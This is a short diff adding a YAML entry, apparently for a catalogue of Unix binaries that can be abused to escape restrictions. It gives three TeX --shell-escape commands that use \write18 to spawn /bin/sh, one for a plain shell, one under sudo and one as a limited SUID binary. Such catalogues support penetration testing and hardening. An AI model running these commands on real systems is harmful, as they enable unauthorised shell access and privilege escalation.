@@ -1,0 +1,11 @@
+functions:
+shell:
+- code: |
+tex --shell-escape '\write18{/bin/sh}nd'
+sudo:
+- code: |
+sudo tex --shell-escape '\write18{/bin/sh}nd'
+limited-suid:
+- code: |
+./tex --shell-escape '\write18{/bin/sh}nd'
+---
